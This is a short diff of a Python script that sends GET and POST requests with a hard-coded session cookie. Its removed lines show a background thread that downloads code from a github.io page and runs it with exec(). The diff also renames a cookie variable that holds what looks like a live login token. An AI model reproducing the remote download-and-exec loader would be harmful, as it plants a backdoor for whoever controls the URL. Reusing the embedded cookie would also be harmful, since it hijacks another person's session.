@@ -1,23 +1,18 @@
 import time,os,threading
 os.system('clear')
 
-def au0():
-	exec(get('https://tad0025.github.io/team_phuc/auto.html').text)
-s0=threading.Thread(name='au0',target=au0)
-s0.start()
-
-cookie='PESAutoLogin=ses_user%3DPhuc_ngaongooo%26ses_hash%3De8ee35ebcac18dd3f8e3cb95ff3636aa'
+cook='PESAutoLogin=ses_user%3DPhuc_ngaongooo%26ses_hash%3De8ee35ebcac18dd3f8e3cb95ff3636aa'
 
 def g(url):
-	global cookie
-	head={'Cookie' : cookie}
+	global cook
+	head={'Cookie' : cook}
 	return get(url=url,headers=head).text
 
 def p(url,data):
-	global cookie
+	global cook
 	head={
 		'Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8',
-		'Cookie' : cookie
+		'Cookie' : cook
 	}
 	return post(url=url,headers=head,data=data).text
 
